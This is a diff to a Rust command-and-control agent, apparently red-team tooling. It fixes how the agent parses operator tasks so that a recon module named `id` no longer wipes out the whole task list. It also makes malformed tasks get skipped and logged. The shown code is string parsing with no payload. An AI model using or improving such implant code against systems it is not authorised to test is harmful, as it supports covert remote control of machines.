@@ -380,14 +380,45 @@ fn parse_tasks(json: &str) -> Option<Vec<(String, String, Vec<String>)>> {
     // Standalone agent: no serde_json. Preserve task args from "args":[...].
     if !json.contains("\"tasks\"") { return Some(vec![]); }
     let mut out = Vec::new();
-    for chunk in json.split("\"id\"").skip(1) {
-        let id = extract_quoted_after_colon(chunk)?;
-        let rest = chunk.split("\"module\"").nth(1)?;
-        let module = extract_quoted_after_colon(rest)?;
+    // Split on the KEY token `"id":`, not the bare string `"id"`. A bare `"id"` also matches a
+    // VALUE — and `"module":"id"` is not hypothetical: the `id` recon module is the 4th of the
+    // five default tasks. That spurious split produced a chunk starting mid-value, whose
+    // `extract_quoted_after_colon` returned None, whose `?` then discarded the ENTIRE task list.
+    // Measured end to end in a disposable guest: the same five tasks returned 5/5 results with
+    // the `id` module swapped out, and 0/5 across all 50 polls with it in.
+    //
+    // Two defects, and only fixing the split would leave the worse one: `?` inside the loop made
+    // one malformed task silently zero every OTHER task, and the caller's `if let Some(tasks)`
+    // then treated "the payload was unparseable" as "the operator queued nothing". A C2 that
+    // reports no work when it cannot read its work is telling the operator something false.
+    // A malformed chunk is now skipped and named on stderr; the tasks that DID parse still run.
+    for chunk in json.split("\"id\":").skip(1) {
+        let Some(id) = extract_quoted_after_colon_key(chunk) else {
+            eprintln!("parse_tasks: skipping task chunk with unreadable id");
+            continue;
+        };
+        let Some(module) = chunk
+            .split("\"module\":")
+            .nth(1)
+            .and_then(extract_quoted_after_colon_key)
+        else {
+            eprintln!("parse_tasks: skipping task id={id} with unreadable module");
+            continue;
+        };
         let args = extract_string_array_after_key(chunk, "args").unwrap_or_default();
         out.push((id, module, args));
     }
     Some(out)
+}
+
+/// Read the quoted string that a `"key":` split has already positioned us after.
+/// `extract_quoted_after_colon` expects to find and step over a `:` itself; splitting on the key
+/// token WITH its colon means the colon is already consumed, so this takes the next quoted run.
+fn extract_quoted_after_colon_key(s: &str) -> Option<String> {
+    let start = s.find('"')? + 1;
+    let rest = &s[start..];
+    let end = rest.find('"')?;
+    Some(rest[..end].to_string())
 }
 
 fn extract_string_array_after_key(s: &str, key: &str) -> Option<Vec<String>> {
